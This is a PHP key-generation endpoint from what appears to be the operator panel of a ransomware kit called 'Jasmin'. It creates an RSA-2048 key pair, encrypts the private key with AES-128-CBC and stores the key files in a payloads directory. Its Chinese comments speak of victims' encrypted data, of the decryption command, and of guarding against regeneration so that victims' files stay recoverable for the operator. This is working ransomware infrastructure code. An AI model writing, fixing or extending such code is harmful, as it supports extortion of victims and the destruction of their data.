<?php
/**
 * RSA密钥对生成API — 私钥AES加密存储
 */
require_once __DIR__ . '/includes/auth.php';
require_once __DIR__ . '/includes/csrf.php';
require_auth();
header('Content-Type: application/json');

// 仅接受 POST + 有效 CSRF：防止 <img src="keygen.php"> 触发的 GET 型 CSRF
// 一旦密钥对被重建，所有已加密的受害者数据将永久无法解密
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'msg' => '仅支持 POST']);
    exit;
}
if (!csrf_verify()) {
    http_response_code(403);
    echo json_encode(['ok' => false, 'msg' => 'CSRF 校验失败，请刷新页面重试']);
    exit;
}

// ── 重建保护 ──
// 生成密钥对会覆盖 payloads/ 下的私钥与口令，一旦覆盖，此前所有已加密的
// 受害者数据将【永久无法解密】。因此：
//   · 首次生成（无已有密钥）直接进行；
//   · 已有密钥时必须显式带 force=1（前端会先弹确认），并先把旧密钥归档。
// 只靠前端 confirm 不够 —— API 可以被直接调用。
$dir0 = __DIR__ . '/payloads';
$existing = file_exists($dir0 . '/jasmin_private.pem');
if ($existing && ($_POST['force'] ?? '') !== '1') {
    http_response_code(409);
    echo json_encode([
        'ok' => false,
        'need_confirm' => true,
        'key_id' => file_exists($dir0 . '/jasmin_public.pem') ? substr(md5(file_get_contents($dir0 . '/jasmin_public.pem')), 0, 8) : '',
        'msg' => '已存在密钥对。重新生成会让此前所有已加密数据永久无法解密，请确认后重试。'
    ]);
    exit;
}

$bits = 2048;
$config = ['private_key_bits' => $bits, 'private_key_type' => OPENSSL_KEYTYPE_RSA];
$key = openssl_pkey_new($config);
if (!$key) {
    // 不回显 openssl_error_string()：内部错误细节(库版本/路径/OpenSSL 状态)不应外泄
    error_log('[jasmin keygen] openssl_pkey_new failed: ' . openssl_error_string());
    echo json_encode(['ok'=>false,'msg'=>'密钥生成失败，详见服务端日志']);
    exit;
}
openssl_pkey_export($key, $priv);
$pub = openssl_pkey_get_details($key)['key'];

$dir = __DIR__ . '/payloads';
if (!is_dir($dir)) mkdir($dir, 0750, true);

// AES-128-CBC 加密私钥（128 位，密钥 = K 的十六进制解码后的 16 字节）
$aes_key = bin2hex(random_bytes(16)); // 32 hex chars = 128 bit
$iv = random_bytes(16);
// 必须与 Python 端 keygen 完全一致（AES-128-CBC，密钥=hex解码后的16字节），
// 否则两端生成的密钥互不兼容，解密命令只能打开其中一种。
$encrypted_priv = openssl_encrypt($priv, 'aes-128-cbc', hex2bin($aes_key), OPENSSL_RAW_DATA, $iv);
$enc_blob = base64_encode($iv . $encrypted_priv);

// 旧密钥先归档：即便误重建，也还有机会找回（.bak 不在 web 可下载白名单内）
if ($existing) {
    $ts = date('Ymd_His');
    foreach (['jasmin_private.pem', 'jasmin_private.pem.enc', 'jasmin_public.pem', '.key_secret'] as $f) {
        $src = $dir . '/' . $f;
        if (file_exists($src)) @copy($src, $dir . '/' . $f . '.bak.' . $ts);
    }
}

// 保存: 加密私钥(公开下载) + 明文私钥(仅后台) + 公钥 + 密码
file_put_contents($dir . '/jasmin_private.pem.enc', $enc_blob);
file_put_contents($dir . '/jasmin_private.pem', $priv);  // 后台下载用
file_put_contents($dir . '/jasmin_public.pem', $pub);
file_put_contents($dir . '/.key_secret', $aes_key);      // 解密密码

// 权限: 必须让 web 用户读得到 —— 直链已被 .htaccess 拒绝，
// 私钥/口令仅经「需登录」的 download_file.php 下发。
// 注意: keygen 可能被 CLI(root) 调用，此时 owner=root 而 Apache 是 www-data，
//       必须 chown 或放开权限，否则 readfile() 会因权限不足失败。
foreach (['jasmin_private.pem.enc', 'jasmin_public.pem', 'jasmin_private.pem', '.key_secret'] as $f) {
    $p = $dir . '/' . $f;
    if (!file_exists($p)) continue;
    @chown($p, 'www-data');
    @chgrp($p, 'www-data');
    @chmod($p, 0640);
    if (!is_readable($p)) @chmod($p, 0644);   // 兜底
}
@chmod($dir, 0755);

echo json_encode([
    'ok'=>true,
    'pub'=>$pub,
    'key_id'=>substr(md5($pub),0,8),
    'msg'=>'RSA-2048 密钥对已生成，私钥已用 AES-128-CBC 加密存储'
]);
